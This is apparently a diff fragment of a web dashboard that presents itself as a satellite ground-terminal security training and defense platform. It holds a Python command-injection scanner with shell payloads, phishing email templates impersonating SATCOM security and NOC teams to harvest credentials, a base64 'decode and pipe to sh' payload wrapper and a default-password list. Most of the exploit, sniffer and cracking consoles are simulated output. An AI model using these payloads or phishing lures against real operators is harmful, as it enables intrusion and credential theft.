+                                <button onclick="copyElementContent('library-code-display')" class="bg-slate-800 hover:bg-slate-700 text-slate-200 text-[11px] px-3 py-1.5 rounded-lg font-bold">📋 Copy Source</button>
+                            </div>
+                            <pre class="bg-slate-950 border border-slate-800 rounded-lg p-4 font-mono text-[11px] leading-relaxed text-cyan-400 overflow-x-auto max-h-[380px] select-all" id="library-code-display"># Loading Script code...</pre>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+        </main>
+    </div>
+
+    <!-- Main Footer -->
+    <footer class="bg-cyber-surface border-t border-slate-800 text-center py-4 text-xs text-slate-500">
+        <div>VSAT Tactical Defense Platform &bull; Built in alignment with Joint NSA-CISA Satcom Infrastructure Safety Directives &copy; 2026</div>
+    </footer>
+
+    <!-- Scripts & Core Business Logic -->
+    <script>
+        // Global Datasets
+        const initialAdvisories = [
+            {
+                id: "ADV-2026-001",
+                title: "Critical Firmware Remote Execution",
+                cve: "CVE-2026-1199",
+                vendor: "Viasat",
+                product: "Axyom Gateway v5.2",
+                severity: "critical",
+                category: "security",
+                summary: "A critical bypass bug allows raw, unauthenticated characters injected into command fields on the /api/config module to run code on target hosts.",
+                action: "Deploy patch 5.2.1 immediately or disable access to ports 80/443 over WAN paths.",
+                source: "NSA Cybersecurity Advisory Feed",
+                date: "2026-01-15",
+                tags: ["known-exploited"]
+            },
+            {
+                id: "ADV-2026-002",
+                title: "Insecure Ground TR-069 Auto-config Provisioning",
+                cve: "CVE-2026-3392",
+                vendor: "Hughes",
+                product: "HT-2000 Router Series",
+                severity: "high",
+                category: "maintenance",
+                summary: "TR-069 endpoints on various models can allow spoofed management systems to push modified configs, enabling traffic extraction.",
+                action: "Enforce digital signature checking on TR-069 payloads and transition parameters to private routes.",
+                source: "CISA Known Exploited Vulnerability Portal",
+                date: "2026-01-10",
+                tags: ["known-exploited"]
+            },
+            {
+                id: "ADV-2025-045",
+                title: "Signal Telemetry Drift & Anomaly Incoherence",
+                cve: "N/A",
+                vendor: "iDirect",
+                product: "Ground Link Systems",
+                severity: "medium",
+                category: "operations",
+                summary: "Identified intermittent signal interference spikes causing packet loss down internal telemetry circuits in designated sectors.",
+                action: "Perform spectrum sweeping and enforce 3-sigma noise filtration limits in diagnostic terminals.",
+                source: "Internal RF Baseline Feed",
+                date: "2025-12-28",
+                tags: []
+            }
+        ];
+
+        const pythonCodeSnippets = {
+            'cve-rce': `#!/usr/bin/env python3
+# CVE-2024-6199 / CVE-2026-1199 Viasat RCE Scanner
+# Dedicated authorized testing within lab environments only
+
+import requests, sys
+from urllib.parse import urljoin
+
+def scan_target_endpoints(target_url):
+    payloads = [
+        {'cmd': '; whoami'},
+        {'cmd': '| id'},
+        {'cmd': '$(whoami)'},
+        {'cmd': '\`hostname\`'}
+    ]
+    endpoints = ['/api/config', '/api/status', '/cgi-bin/admin', '/admin/system']
+    print(f"[*] Scanning {target_url} for remote code execution flaws...")
+    
+    for endpoint in endpoints:
+        url = urljoin(target_url, endpoint)
+        for payload in payloads:
+            try:
+                r = requests.get(url, params=payload, timeout=4, verify=False)
+                if r.status_code == 200 and ('uid=' in r.text or 'root' in r.text or 'sh:' in r.text):
+                    print(f"[!!!] VULNERABILITY FOUND: {url} via GET {payload}")
+                    return True
+            except Exception as e:
+                pass
+    print("[✓] Scan complete. No signature anomalies identified.")
+    return False`,
+
+            'tr069': `#!/usr/bin/env python3
+# TR-069 ACS Security Traffic Auditor
+# Monitors telemetry endpoints for unauthorized provisioning changes
+
+import subprocess, sys
+
+def audit_tr069_traffic(interface='eth0'):
+    print(f"[*] Initializing TR-069 audit monitoring loop on interface: {interface}")
+    cmd = f"sudo tcpdump -i {interface} -n 'tcp and (port 80 or 443 or 7547 or 7548)' -A -l"
+    
+    try:
+        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, text=True)
+        for line in proc.stdout:
+            line_normalized = line.lower()
+            if 'cwmp' in line_normalized or 'tr-069' in line_normalized:
+                print(f"[TR-069 MATCH] {line.strip()}")
+                if 'reboot' in line_normalized:
+                    print("[!!!] ALERT: Remote hardware reboot command captured!")
+    except KeyboardInterrupt:
+        print("[*] Monitoring execution cleanly halted.")`,
+
+            'signal': `#!/usr/bin/env python3
+# VSAT RF Telemetry Baseline Analyzer
+# Captures standard network deviations to verify signal injection anomalies
+
+import subprocess, json
+from statistics import mean, stdev
+
+def collect_telemetry_baselines(endpoint_ip, capture_cycles=10):
+    baseline_records = []
+    print(f"[*] Starting collection loop against gateway link: {endpoint_ip}")
+    # Analyzes carrier metrics, jitter, SNR patterns`
+        };
+
+        const phishTemplates = {
+            'fw-update': `Subject: [ACTION REQUIRED] Critical Satcom Gateway Update Directive - Ground Terminal Security Patching
+
+Dear SATCOM Operations team,
+
+In compliance with NSA and CISA Cybersecurity Guidelines for Space Systems Ground Hardening, a critical firmware vulnerability (similar to the CVE-2024-6199 bypass) has been identified inside various active terminal modems.
+
+All field engineers and Network Control Center analysts are advised to initiate immediate verification of their local router models.
+
+Please proceed to the validation gateway to submit credentials and lock terminal administration down immediately:
+[ {{URL}} ]
+
+Thank you,
+SATCOM Security Operations & Systems Hardening Center`,
+
+            'auth-bypass': `Subject: ALERT: Immediate Administrative Session Validation - Secondary Link Failure
+
+Attention NOC Team,
+
+Due to a reported carrier degradation and multi-path transition loss on localized subnets, standard administrative authentication sessions on maritime and pipeline remote terminals have been invalidated.
+
+To prevent telemetry tracking drift, you are required to log into the administrative management plane directly and verify SNMP Community Configurations:
+[ {{URL}} ]
+
+Failure to validate terminal status within 60 minutes may lead to temporary tracking lock disablement.
+
+Regards,
+NOC Space Communications Engineering Team`,
+
+            'maritime-fail': `Subject: CRITICAL: Maritime Telemetry Transponder Desynchronization Protocol
+
+Alert Code: MAR-SAT-2026
+
+Attention Shipping Captains and Communications Engineers,
+
+A total transponder clock offset discrepancy (+200ms skew) has been identified between regional ground stations and on-board VSAT receivers.
+
+Please connect a secure console to the management gateway interface to execute the stabilization routine:
+[ {{URL}} ]
+
+Do not close this console window until the carrier lock has re-established.
+
+Maritime Link Support Desk`
+        };
+
+        // App Global State
+        const appState = {
+            advisories: [...initialAdvisories],
+            toastTimeout: null,
+            telemetryData: {
+                snr: Array.from({length: 40}, () => 14 + Math.random() * 2),
+                doppler: Array.from({length: 40}, () => 5 + Math.random() * 5),
+                jitter: Array.from({length: 40}, () => 10 + Math.random() * 4),
+                freq: Array.from({length: 40}, () => 11.5)
+            },
+            signalAnomalyActive: false,
+            canvasContext: null,
+            canvasElement: null,
+            activeSniffer: null,
+            snifferPacketsCount: 0,
+            // Hardening States
+            enforceHttps: false,
+            secureSnmp: false,
+            networkSegregated: false,
+            codeSignatureEnforced: false,
+            // Advanced Tool States
+            activeIDSRules: [],
+            spectralNoiseFactor: 0.1,
+            spectrogramCanvasElement: null,
+            spectrogramContext: null
+        };
+
+        // Application Onload Configuration
+        window.onload = function () {
+            // Live clock cycle
+            setInterval(() => {
+                const clock = document.getElementById('utc-clock');
+                if (clock) {
+                    clock.textContent = new Date().toISOString().replace('T', ' ').substring(0, 19);
+                }
+            }, 1000);
+
+            // Render Advisories
+            renderThreatIntelFeed();
+
+            // Set up RF Canvas
+            appState.canvasElement = document.getElementById('telemetry-canvas');
+            if (appState.canvasElement) {
+                appState.canvasContext = appState.canvasElement.getContext('2d');
+                resizeCanvasToContainer();
+                window.addEventListener('resize', resizeCanvasToContainer);
+                requestAnimationFrame(drawTelemetryGraph);
+            }
+
+            // Init setups
+            updatePhishingTemplatePreview();
+            calculateComplianceScore();
+            displayLibraryScript('cve-rce');
+
+            // Initialize Spectrogram Engine for Element 10
+            initSpectrogramCanvas();
+        };
+
+        // Application Onload Configuration
+        window.onload = function () {
+            // Live clock cycle
+            setInterval(() => {
+                const clock = document.getElementById('utc-clock');
+                if (clock) {
+                    clock.textContent = new Date().toISOString().replace('T', ' ').substring(0, 19);
+                }
+            }, 1000);
+
+            // Render Advisories
+            renderThreatIntelFeed();
+
+            // Set up RF Canvas
+            appState.canvasElement = document.getElementById('telemetry-canvas');
+            if (appState.canvasElement) {
+                appState.canvasContext = appState.canvasElement.getContext('2d');
+                resizeCanvasToContainer();
+                window.addEventListener('resize', resizeCanvasToContainer);
+                requestAnimationFrame(drawTelemetryGraph);
+            }
+
+            // Init setups
+            updatePhishingTemplatePreview();
+            calculateComplianceScore();
+            displayLibraryScript('cve-rce');
+        };
+
+        // Tab Switcher Mechanic
+        function switchTab(tabId) {
+            document.querySelectorAll('.tab-content').forEach(element => {
+                element.classList.add('hidden');
+            });
+
+            document.querySelectorAll('.tab-btn').forEach(btn => {
+                btn.className = "tab-btn w-full flex items-center gap-3 px-3 py-2 rounded-lg text-xs font-medium transition-all text-slate-400 hover:text-slate-200 hover:bg-slate-900";
+            });
+
+            const targetContent = document.getElementById(tabId);
+            if (targetContent) {
+                targetContent.classList.remove('hidden');
+            }
+
+            const sourceBtn = Array.from(document.querySelectorAll('.tab-btn')).find(b => b.getAttribute('onclick').includes(tabId));
+            if (sourceBtn) {
+                sourceBtn.className = "tab-btn w-full flex items-center gap-3 px-3 py-2 rounded-lg text-xs font-medium transition-all text-cyan-400 bg-cyan-950/20 border-l-2 border-cyan-500";
+            }
+
+            showNotification(`Module pivot: Entered ${tabId.replace('-', ' ').toUpperCase()}`, 'info');
+        }
+
+        // Global Alert Toast Notification Trigger
+        function showNotification(message, type = 'success') {
+            const container = document.getElementById('toast-container');
+            if (!container) return;
+
+            const colors = {
+                success: 'border-emerald-500/50 bg-emerald-950/85 text-emerald-300',
+                warning: 'border-amber-500/50 bg-amber-950/85 text-amber-300',
+                error: 'border-red-500/50 bg-red-950/85 text-red-300',
+                info: 'border-cyan-500/50 bg-cyan-950/85 text-cyan-300'
+            };
+
+            const toast = document.createElement('div');
+            toast.className = `p-3 rounded-lg border text-xs font-semibold backdrop-blur-sm shadow-xl transition-all duration-300 translate-x-5 opacity-0 ${colors[type]}`;
+            toast.innerHTML = `
+                <div class="flex items-center justify-between gap-4">
+                    <span>${message}</span>
+                    <button class="text-[10px] opacity-70 hover:opacity-100" onclick="this.parentElement.parentElement.remove()">✕</button>
+                </div>
+            `;
+
+            container.appendChild(toast);
+            setTimeout(() => toast.classList.remove('translate-x-5', 'opacity-0'), 10);
+            setTimeout(() => {
+                toast.classList.add('translate-x-5', 'opacity-0');
+                setTimeout(() => toast.remove(), 300);
+            }, 4000);
+        }
+
+        function toggleElement(id) {
+            const el = document.getElementById(id);
+            if (el) el.classList.toggle('hidden');
+        }
+
+        // Threat Intelligence Render Mechanics
+        function renderThreatIntelFeed() {
+            const container = document.getElementById('intel-feed-container');
+            const counter = document.getElementById('stat-kev-count');
+            if (!container) return;
+
+            container.innerHTML = '';
+            let activeKevCount = 0;
+
+            appState.advisories.forEach(adv => {
+                const isKev = adv.tags && adv.tags.includes('known-exploited');
+                if (isKev) activeKevCount++;
+
+                const colors = {
+                    critical: 'bg-red-500/10 border-red-500/30 text-red-400',
+                    high: 'bg-amber-500/10 border-amber-500/30 text-amber-400',
+                    medium: 'bg-yellow-500/10 border-yellow-500/20 text-yellow-300',
+                    low: 'bg-slate-500/10 border-slate-500/20 text-slate-400'
+                };
+
+                const block = document.createElement('div');
+                block.className = `bg-cyber-surface border rounded-xl p-5 space-y-4 transition-all hover:border-slate-700 ${isKev ? 'border-red-500/20 ring-1 ring-red-500/5' : 'border-slate-800'}`;
+                
+                block.innerHTML = `
+                    <div class="flex justify-between items-start flex-wrap gap-2">
+                        <div class="space-y-1">
+                            <span class="text-[10px] font-mono font-bold uppercase ${colors[adv.severity]} border px-2 py-0.5 rounded-md">
+                                ${adv.severity.toUpperCase()}
+                            </span>
+                            <h3 class="text-sm font-bold text-white mt-1.5 flex items-center gap-2">
+                                ${adv.title}
+                                ${isKev ? '<span class="bg-red-500/15 border border-red-500/30 text-red-400 text-[10px] px-2 py-0.5 rounded font-bold uppercase">CISA KEV MATCH</span>' : ''}
+                            </h3>
+                            <p class="text-[11px] text-slate-400">Target Segment: <span class="font-mono text-cyan-400 font-semibold">${adv.vendor} (${adv.product || 'All Devices'})</span></p>
+                        </div>
+                        <span class="text-xs font-mono text-slate-500">${adv.date}</span>
+                    </div>
+                    <div class="p-3 bg-slate-950/60 rounded-lg border border-slate-800 text-xs text-slate-300 font-normal leading-relaxed">
+                        <strong class="text-slate-200">Vulnerability Description:</strong> ${adv.summary}
+                    </div>
+                    <div class="p-3 bg-emerald-950/10 rounded-lg border border-emerald-500/10 text-xs text-slate-300 leading-relaxed">
+                        <strong class="text-emerald-400">Mitigation:</strong> ${adv.action}
+                    </div>
+                    <div class="flex justify-between items-center text-[10px] text-slate-500 pt-2 border-t border-slate-800/60 font-mono">
+                        <span>Source: ${adv.source}</span>
+                        ${adv.cve && adv.cve !== 'N/A' ? `<span>CVE ID: <span class="text-cyan-500 font-bold">${adv.cve}</span></span>` : ''}
+                    </div>
+                `;
+                container.appendChild(block);
+            });
+
+            if (counter) counter.textContent = activeKevCount;
+        }
+
+        function submitCustomAdvisory() {
+            const cve = document.getElementById('intel-cve').value || 'N/A';
+            const title = document.getElementById('intel-title').value;
+            const severity = document.getElementById('intel-severity').value;
+            const summary = document.getElementById('intel-summary').value;
+            const action = document.getElementById('intel-action').value;
+
+            if (!title || !summary || !action) {
+                showNotification("All inputs required to construct new advisories.", "error");
+                return;
+            }
+
+            const newAdv = {
+                id: `ADV-2026-${Math.floor(100 + Math.random() * 900)}`,
+                title,
+                cve,
+                vendor: "Custom Registered Target",
+                product: "Satcom Transponder Interface",
+                severity,
+                category: "security",
+                summary,
+                action,
+                source: "Manual Analyst Entry",
+                date: new Date().toISOString().split('T')[0],
+                tags: []
+            };
+
+            appState.advisories.unshift(newAdv);
+            renderThreatIntelFeed();
+            toggleElement('custom-intel-form');
+            showNotification("Threat Advisory registered successfully.", "success");
+
+            // Reset inputs
+            document.getElementById('intel-cve').value = '';
+            document.getElementById('intel-title').value = '';
+            document.getElementById('intel-summary').value = '';
+            document.getElementById('intel-action').value = '';
+        }
+
+        // Wide-Spectrum Vulnerability Scanner (Element 1) Execution
+        function runVulnerabilityScanner() {
+            const target = document.getElementById('scan-target-range').value;
+            const profile = document.getElementById('scan-profile-selector').value;
+            const community = document.getElementById('scan-snmp-community').value;
+            const consoleBox = document.getElementById('scan-console-log');
+            const dot = document.getElementById('scan-status-dot');
+            const text = document.getElementById('scan-status-text');
+            const counts = document.getElementById('scan-results-summary');
+
+            // Compliance configuration checks
+            const secureCreds = document.getElementById('chk-secure-creds').checked;
+            const enforceHttps = document.getElementById('chk-enforce-https').checked;
+            const netSeg = document.getElementById('chk-network-seg').checked;
+            const codeSig = document.getElementById('chk-code-sig').checked;
+
+            // Checked phases from UI
+            const auditPorts = document.getElementById('phase-ports').checked;
+            const auditWan = document.getElementById('phase-wan').checked;
+            const auditFirmware = document.getElementById('phase-firmware').checked;
+            const auditHardware = document.getElementById('phase-hardware').checked;
+            const auditRf = document.getElementById('phase-rf').checked;
+
+            if (!target) {
+                showNotification("Target IP range is required.", "error");
+                return;
+            }
+
+            dot.className = "h-1.5 w-1.5 rounded-full bg-amber-500 animate-pulse";
+            text.textContent = "DEEP AUDIT SCAN RUNNING...";
+            text.className = "text-amber-500 font-bold";
+            
+            consoleBox.textContent = `================================================================================
+          SATELLITE GROUND SEGMENT WIDE-SPECTRUM VULNERABILITY SWEEP
+================================================================================
+[*] Target Subnet Address Range : ${target}
+[*] Running Scanner Profile Mode: [${profile.toUpperCase()}]
+[*] Scanning Trigger Timestamp  : ${new Date().toISOString()}
+[*] Fetching local security configurations...
+`;
+
+            let anomaliesLogged = 0;
+            const steps = [];
+            let totalDelay = 100;
+
+            // Phase 0: Network Discovery
+            steps.push({ log: `[*] PHASE 0: Network Discovery & Host Sweep initiated...`, time: totalDelay });
+            totalDelay += 400;
+
+            if (netSeg) {
+                steps.push({ log: `[✓] ALERT: VLAN Network Segmentation Rule Enforced.`, time: totalDelay });
+                steps.push({ log: `[-] Host Discovery: target IP path ${target} unreachable from current analyst gateway.`, time: totalDelay + 300 });
+                steps.push({ log: `[✓] Sweep completed safely. 0 hosts reached. Hardened boundary verified.`, time: totalDelay + 800 });
+                totalDelay += 1000;
+            } else {
+                steps.push({ log: `[+] Discovery: Host reached at 192.168.100.1 (VSAT Ground Terminal Modulator Hub).`, time: totalDelay });
+                steps.push({ log: `[+] Discovery: Host reached at 192.168.100.15 (Network Operations Center Console).`, time: totalDelay + 200 });
+                totalDelay += 500;
+
+                // Phase 1: Ports Sweep
+                if (auditPorts) {
+                    steps.push({ log: `\n[*] PHASE 1: Probing Administrative TCP/UDP Control Ports...`, time: totalDelay });
+                    totalDelay += 400;
+
+                    // Port 21 FTP
+                    if (secureCreds) {
+                        steps.push({ log: `[✓] Port 21 (FTP): Anonymous login strictly disabled. Authentication enforced.`, time: totalDelay });
+                    } else {
+                        steps.push({ log: `[!!!] Port 21 (FTP): OPEN on NOC Console. Anonymous read/write enabled. Information leak threat!`, time: totalDelay });
+                        anomaliesLogged++;
+                    }
+                    totalDelay += 300;
+
+                    // Port 23 Telnet
+                    if (secureCreds) {
+                        steps.push({ log: `[✓] Port 23 (Telnet): Daemon disabled. Interactive commands restricted to encrypted channels.`, time: totalDelay });
+                    } else {
+                        steps.push({ log: `[!!!] Port 23 (Telnet): OPEN on Terminal Modulator. Raw cleartext commands transiting. Credentials visible!`, time: totalDelay });
+                        anomaliesLogged++;
+                    }
+                    totalDelay += 300;
+
+                    // Port 80 HTTP
+                    if (enforceHttps) {
+                        steps.push({ log: `[✓] Port 80 (HTTP): CLOSED / Redirecting to secure administration port (HTTPS/443).`, time: totalDelay });
+                        steps.push({ log: `[✓] Port 443 (HTTPS): OPEN with high-strength TLS 1.3 cryptographic bindings.`, time: totalDelay + 200 });
+                    } else {
+                        steps.push({ log: `[!!!] Port 80 (HTTP): OPEN. Web administrative panel is completely unencrypted. Cleartext cookies in transit!`, time: totalDelay });
+                        steps.push({ log: `[!!!] CVE-2024-6199 (Viasat Command Bypass RCE): Unhardened parameter inputs detected on /api/config. VULNERABLE!`, time: totalDelay + 250 });
+                        anomaliesLogged += 2;
+                    }
+                    totalDelay += 500;
+
+                    // Port 161 SNMP
+                    if (secureCreds || community !== 'public') {
+                        steps.push({ log: `[✓] Port 161 (SNMP): Default credentials rejected. Secure SNMPv3 authentication enforced.`, time: totalDelay });
+                    } else {
+                        steps.push({ log: `[!!!] Port 161 (SNMP): OPEN with default community string '${community}'. Remote configuration readable!`, time: totalDelay });
+                        anomaliesLogged++;
+                    }
+                    totalDelay += 300;
+                }
+
+                // Phase 2: WAN Auto-Provisioning CWMP Check
+                if (auditWan) {
+                    steps.push({ log: `\n[*] PHASE 2: Auditing Port 7547 (TR-069 CWMP WAN Auto-Configuration Interface)...`, time: totalDelay });
+                    totalDelay += 400;
+
+                    if (netSeg) {
+                        steps.push({ log: `[✓] TR-069 Endpoints are fully isolated from WAN interfaces.`, time: totalDelay });
+                    } else {
+                        steps.push({ log: `[!] Port 7547 (TR-069): Exposed to incoming networks.`, time: totalDelay });
+                        steps.push({ log: `[!!!] CVE-2026-3392 (TR-069 Rogue ACS Push): Target modem accepts unsigned CWMP provisioning inputs. VULNERABLE!`, time: totalDelay + 300 });
+                        anomaliesLogged++;
+                    }
+                    totalDelay += 600;
+                }
+
+                // Phase 3: Firmware Partition Integrity Check
+                if (auditFirmware) {
+                    steps.push({ log: `\n[*] PHASE 3: Fetching Target Modulator Partition Signatures for Cryptographic Audit...`, time: totalDelay });
+                    totalDelay += 400;
+
+                    if (codeSig) {
+                        steps.push({ log: `[✓] Cryptographic Code Signature validation verified on operating system filesystem kernel.`, time: totalDelay });
+                    } else {
+                        steps.push({ log: `[!!!] Unsigned firmware update accepted. Arbitrary binary partition overwrite threat detected!`, time: totalDelay });
+                        anomaliesLogged++;
+                    }
+                    totalDelay += 500;
+                }
+
+                // Phase 4: JTAG/UART Hardware Debug Interfaces Check
+                if (auditHardware) {
+                    steps.push({ log: `\n[*] PHASE 4: Auditing physical hardware debugger connections (JTAG/UART)...`, time: totalDelay });
+                    totalDelay += 400;
+
+                    if (profile === 'deep') {
+                        steps.push({ log: `[!] Querying MIPS core state control lines...`, time: totalDelay });
+                        steps.push({ log: `[!!!] Hardware Console exposed. Device registers readable via unauthenticated UART pins.`, time: totalDelay + 350 });
+                        anomaliesLogged++;
+                    } else {
+                        steps.push({ log: `[*] Quick sweep omitted deep JTAG logic boundary checks.`, time: totalDelay });
+                    }
+                    totalDelay += 600;
+                }
+
+                // Phase 5: RF Signal Carrier Check
+                if (auditRf) {
+                    steps.push({ log: `\n[*] PHASE 5: Fetching active Carrier and Spectrum Telemetry metrics...`, time: totalDelay });
+                    totalDelay += 400;
+
+                    if (appState.signalAnomalyActive) {
+                        steps.push({ log: `[!!!] Carrier SNR is severely degraded (${document.getElementById('telemetry-snr').textContent}). Low margins.`, time: totalDelay });
+                        steps.push({ log: `[!!!] Clock Offset/Skew discrepancy detected (${document.getElementById('telemetry-doppler').textContent}). Desynchronization threat!`, time: totalDelay + 250 });
+                        anomaliesLogged += 2;
+                    } else {
+                        steps.push({ log: `[✓] Carrier Tracking alignment secure. SNR margin stable above 14.0 dB limit. Clock synched.`, time: totalDelay });
+                    }
+                    totalDelay += 500;
+                }
+
+                steps.push({ log: `\n================================================================================`, time: totalDelay });
+                steps.push({ log: `[✓] Full-Spectrum Ground & Space Security Sweep Completed.`, time: totalDelay + 200 });
+            }
+
+            steps.forEach(step => {
+                setTimeout(() => {
+                    consoleBox.textContent += step.log + "\n";
+                    consoleBox.scrollTop = consoleBox.scrollHeight;
+                }, step.time);
+            });
+
+            const finalTime = totalDelay + 500;
+
+            setTimeout(() => {
+                dot.className = "h-1.5 w-1.5 rounded-full bg-emerald-500";
+                text.textContent = "COMPLETED";
+                text.className = "text-emerald-400 font-bold";
+                
+                if (netSeg) {
+                    counts.textContent = "Flags: 0 Anomalies Identified (Network Segregated)";
+                } else {
+                    counts.textContent = `Flags: ${anomaliesLogged} Security Anomalies Identified`;
+                }
+                showNotification("Full-spectrum vulnerability audit successfully processed.", "success");
+            }, finalTime);
+        }
+
+        // Controlled Exploitation (Element 2) Execution
+        function runExploitSimulation() {
+            const url = document.getElementById('exploit-target-url').value;
+            const module = document.getElementById('exploit-module-selector').value;
+            const payload = document.getElementById('exploit-payload-input').value;
+            const consoleBox = document.getElementById('exploit-console-log');
+            const dot = document.getElementById('exploit-status-dot');
+            const text = document.getElementById('exploit-status-text');
+            const verdict = document.getElementById('exploit-verdict');
+
+            const secureCreds = document.getElementById('chk-secure-creds').checked;
+            const enforceHttps = document.getElementById('chk-enforce-https').checked;
+            const codeSig = document.getElementById('chk-code-sig').checked;
+            const netSeg = document.getElementById('chk-network-seg').checked;
+
+            if (!url) {
+                showNotification("Target administrative URL is required.", "error");
+                return;
+            }
+
+            dot.className = "h-1.5 w-1.5 rounded-full bg-red-500 animate-pulse";
+            text.textContent = "PROBING ENDPOINT...";
+            text.className = "text-red-500 font-bold";
+            consoleBox.textContent = `[*] Loading exploit module parameters: [${module.toUpperCase()}]\n[*] Connecting target endpoint: ${url}\n`;
+
+            const steps = [];
+
+            if (netSeg) {
+                steps.push({ log: `[-] CONNECTION REFUSED: Ground segment target is isolated on secure management VLAN plane.`, time: 800 });
+                steps.push({ log: `[-] EXPLOIT FAILED: Host unreachable from current network segment.`, time: 1500 });
+            } else if (enforceHttps && url.startsWith("http://")) {
+                steps.push({ log: `[-] CONNECTION TERMINATED: Target administrative interface strictly rejects unencrypted Port 80 HTTP requests.`, time: 800 });
+                steps.push({ log: `[-] EXPLOIT FAILED: TLS/HTTPS redirection active. Exploit payloads cannot transit on unencrypted paths.`, time: 1500 });
+            } else if (codeSig && module !== 'tr069-poison') {
+                steps.push({ log: `[*] Transmitting bypass command injection payload structure: '${payload}'`, time: 800 });
+                steps.push({ log: `[-] ACCESS DENIED: Firmware process spawned signature validation check... FAILED.`, time: 1600 });
+                steps.push({ log: `[-] EXPLOIT BLOCKED: Cryptographic image signature checks are actively enforced. Raw opcodes injection blocked.`, time: 2400 });
+            } else {
+                steps.push({ log: `[*] Sending unauthenticated payload sequence characters: '${payload}'`, time: 600 });
+                steps.push({ log: `[*] Validating response packet sizes and parsing raw stream header...`, time: 1300 });
+                steps.push({ log: `[+] Success! Exploitation bypass succeeded over administrative routing parameters.`, time: 2000 });
+                steps.push({ log: `[+] Captured remote server metrics: uid=0(root) gid=0(root) groups=0(root)`, time: 2700 });
+            }
+
+            steps.forEach(step => {
+                setTimeout(() => {
+                    consoleBox.textContent += step.log + "\n";
+                    consoleBox.scrollTop = consoleBox.scrollHeight;
+                }, step.time);
+            });
+
+            const success = !netSeg && !(enforceHttps && url.startsWith("http://")) && !(codeSig && module !== 'tr069-poison');
+            const finalTime = success ? 3200 : 2500;
+
+            setTimeout(() => {
+                dot.className = "h-1.5 w-1.5 rounded-full bg-emerald-500";
+                text.textContent = "PROBE FINALIZED";
+                text.className = "text-emerald-400 font-bold";
+                
+                if (success) {
+                    verdict.textContent = "Probe Status: EXPLOITED SUCCESSFULLY";
+                    verdict.className = "text-red-400 font-bold font-mono";
+                    showNotification("Exploitation probe successfully established shell access.", "success");
+                } else {
+                    verdict.textContent = "Probe Status: EXPLOIT BLOCKED / MITIGATED";
+                    verdict.className = "text-emerald-400 font-bold font-mono";
+                    showNotification("Exploit attempts blocked by active defensive hardening policies.", "info");
+                }
+            }, finalTime);
+        }
+
+        // Packet Sniffer Engine (Element 3) Execution
+        function startSnifferEngine(state) {
+            const consoleBox = document.getElementById('net-packet-console');
+            const counter = document.getElementById('net-packets-count');
+            const iface = document.getElementById('net-interface').value;
+            const filter = document.getElementById('net-filter').value;
+
+            if (!state) {
+                if (appState.activeSniffer) {
+                    clearInterval(appState.activeSniffer);
+                    appState.activeSniffer = null;
+                }
+                consoleBox.textContent += `\n[*] Sniffing session ended. Parsed ${appState.snifferPacketsCount} network packets.`;
+                showNotification("Network capture interface disabled.", "info");
+                return;
+            }
+
+            if (appState.activeSniffer) clearInterval(appState.activeSniffer);
+            
+            consoleBox.textContent = `[*] Sniffing active on interface: [${iface}] with filters [${filter}]\n`;
+            appState.snifferPacketsCount = 0;
+
+            appState.activeSniffer = setInterval(() => {
+                appState.snifferPacketsCount++;
+                counter.textContent = `${appState.snifferPacketsCount} packets`;
+
+                const protocols = ["TCP", "UDP", "TR-069/CWMP", "ICMP"];
+                const sources = ["192.168.100.1", "10.122.44.18", "192.168.100.5", "10.122.44.1"];
+                const proto = protocols[Math.floor(Math.random() * protocols.length)];
+                const src = sources[Math.floor(Math.random() * sources.length)];
+                const dst = sources[Math.floor(Math.random() * sources.length)];
+
+                let metricLine = `[Packet #${appState.snifferPacketsCount}] [${proto}] Source: ${src} -> Destination: ${dst} Length: ${Math.floor(64 + Math.random() * 1024)} bytes\n`;
+                if (proto === 'TR-069/CWMP' && Math.random() > 0.6) {
+                    metricLine += `  └─ [INFO] CWMP Payload Match: InformRequest; parameterKey='viasat_config_auth'\n`;
+                }
+
+                consoleBox.textContent += metricLine;
+                consoleBox.scrollTop = consoleBox.scrollHeight;
+            }, 800);
+
+            showNotification("Network packet inspection active.", "success");
+        }
+
+        // Exploit Formulation Compiler (Element 4) Execution
+        function compileExploitPayload() {
+            const arch = document.getElementById('payload-arch').value;
+            const cmd = document.getElementById('payload-shellcode-cmd').value;
+            const encoder = document.getElementById('payload-encoder').value;
+            const box = document.getElementById('payload-assembly-box');
+
+            box.textContent = `[*] Target Machine Environment: [${arch.toUpperCase()}]\n[*] Formulating shellcode block parsing command: "${cmd}"\n`;
+
+            setTimeout(() => {
+                let bytes = "";
+                for (let i = 0; i < 24; i++) {
+                    bytes += `\\x${Math.floor(16 + Math.random() * 240).toString(16)}`;
+                }
+
+                box.textContent += `[*] Shellcode opcodes structured: ${bytes}\n`;
+                
+                if (encoder === 'base64') {
+                    const encoded = btoa(cmd);
+                    box.textContent += `[*] Encoding algorithm applied: [BASE64 ENVELOPE]\n[*] Output:\nsh -c "echo ${encoded} | base64 -d | sh"`;
+                } else if (encoder === 'hex') {
+                    let hexOut = "";
+                    for (let i = 0; i < cmd.length; i++) {
+                        hexOut += `\\x${cmd.charCodeAt(i).toString(16)}`;
+                    }
+                    box.textContent += `[*] Encoding algorithm applied: [HEX ESCAPE CODES]\n[*] Output:\n${hexOut}`;
+                } else {
+                    box.textContent += `[*] Output:\n${cmd}`;
+                }
+
+                showNotification("Exploit shellcode formulation assembled.", "success");
+            }, 800);
+        }
+
+        // Password Cracker / Recovery (Element 5) Execution
+        function executeBruteforceRun() {
+            const mode = document.getElementById('crack-target-type').value;
+            const ip = document.getElementById('crack-target-ip').value;
+            const wordlist = document.getElementById('crack-wordlist').value;
+            const bar = document.getElementById('crack-progress-bar');
+            const consoleBox = document.getElementById('crack-console-log');
+
+            if (!ip) {
+                showNotification("Authentication target IP is required.", "error");
+                return;
+            }
+
+            bar.style.width = "0%";
+            consoleBox.textContent = `[*] Initializing Password Auditing Mode: [${mode.toUpperCase()}] against target: ${ip}\n[*] Wordlist Database Configuration: [${wordlist.toUpperCase()}]\n`;
+
+            let progress = 0;
+            const passwords = ["123456", "password", "admin", "viasat123", "operator", "root", "secret", "shuttle1", "admin123"];
+            
+            const run = setInterval(() => {
+                progress += 10;
+                bar.style.width = `${progress}%`;
+
+                if (progress < 100) {
+                    const pass = passwords[Math.floor(Math.random() * passwords.length)];
+                    consoleBox.textContent += `[*] Validating authentication parameter sequence: 'admin' / '${pass}'... Access Denied\n`;
+                    consoleBox.scrollTop = consoleBox.scrollHeight;
+                } else {
+                    clearInterval(run);
+                    const found = mode === 'snmp' ? "private" : "viasat123";
